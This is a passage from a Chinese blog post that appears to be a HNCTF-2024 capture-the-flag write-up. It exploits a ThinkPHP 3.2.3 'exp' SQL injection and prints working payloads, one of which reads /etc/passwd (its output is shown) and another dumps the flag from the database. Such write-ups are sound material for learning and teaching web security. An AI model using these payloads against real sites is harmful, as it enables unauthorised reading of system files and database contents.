class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;<span class="hljs-title function_ invoke__">select</span>();<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$ret</span>, <span class="hljs-literal">true</span>);<br>        &#125;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看配置文件，可以知道是 <code>Thinkphp3.2.3</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>    <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>搜索得知，<code>exp注入</code> 较为符合，但是在官方版本 <code>I()</code>函数里过滤了 <code>exp</code>，卡了半天</p><p>后来查看发现作者应该是重新删掉了 <code>exp</code> ?</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">http://<span class="hljs-title">hnctf.imxbt.cn</span>:48541/<span class="hljs-title">index.php</span>/<span class="hljs-title">Home</span>/<span class="hljs-title">Index</span>/<span class="hljs-title">h_n</span>?<span class="hljs-title">name</span>[0]=<span class="hljs-title">exp</span>&amp;<span class="hljs-title">name</span>[1]==1 <span class="hljs-title">or</span> 1=1</span><br></code></pre></td></tr></table></figure><p>即可注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># name[0]=exp&amp;name[1]==1 union select 1,load_file(&#x27;/etc/passwd&#x27;)</span><br><br>array ( <span class="hljs-number">0</span> =&gt; array ( <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span> =&gt; <span class="hljs-string">&#x27;root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false &#x27;</span>, ), )<br></code></pre></td></tr></table></figure><p>然后又卡在了奇怪的地方，以为 <code>flag</code> 在服务器上，读了半天环境没读出来</p><p>结果看wp发现在数据库里（哎</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># =1 union select 12,flag from think.flag</span><br><br>array ( <span class="hljs-number">0</span> =&gt; array ( <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;12&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span> =&gt; <span class="hljs-string">&#x27;H&amp;NCTF&#123;Cjp_aae0e1d1-4c8f-4488-98c0-58e64bc32555&#125;&#x27;</span>, ), )<br></code></pre></td></tr></table></figure><p>后来才知道一开始的版本log都泄露了</p><p>不懂怎么不把题下了</p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/CTF/" class="category-chain-item">CTF</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/CTF/" class="print-no-link">#CTF</a></div></div><div class="license-box my-3"><div class="license-title"><div>HNCTF-2024</div><div>http://example.com/posts/5ae288a7/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>Fanllspd</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2024年5月13日</div></div><div class="license-meta-item license-meta-date"><div>更新于</div><div>2024年5月14日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/posts/72dd718d/" title="UESTC-iCoding-F2"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">UESTC-iCoding-F2</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/posts/a932742f/" title="NSSCTF-Round#20-Basic-WEB"><span class="hidden-mobile">NSSCTF-Round#20-Basic-WEB</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="waline"></div><script type="text/javascript">Fluid.utils.loadComments("#waline",(function(){Fluid.utils.createCssLink("https://cdn.staticfile.org/waline/2.15.5/waline.min.css"),Fluid.utils.createScript("https://cdn.staticfile.org/waline/2.15.5/waline.min.js",(function(){var e=Object.assign({serverURL:"https://waline-comments-blue.vercel.app/",locale:{placeholder:"Share something plz~~"},avatar:"robohash",path:"window.location.pathname",meta:["nick","mail","link"],requiredMeta:["nick"],lang:"zh-CN",emoji:["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],dark:'html[data-user-color-scheme="dark"]',wordLimit:0,pageSize:10,reaction:!0},{el:"#waline",path:window.location.pathname});Waline.init(e),fetch("https://api.xygeng.cn/One").then(e=>e.json()).then(e=>{document.getElementById("wl-edit").placeholder=`${e.data.content}--${e.data.origin}`}).catch(console.error),Fluid.utils.waitElementVisible("#waline .vcontent",()=>{var e="#waline .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(e),Fluid.plugins.fancyBox(e)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({easing:"ease",speed:500,showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/yinghua.js"></script><script src="/js/BgLine.js"></script><script src="/js/walinePlaceHolder.js"></script><script src="/js/scrollAnimation.js"></script><script src="/js/backgroundize.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript><script>var endLoading=function(){document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")};window.addEventListener("load",endLoading)</script></body></html>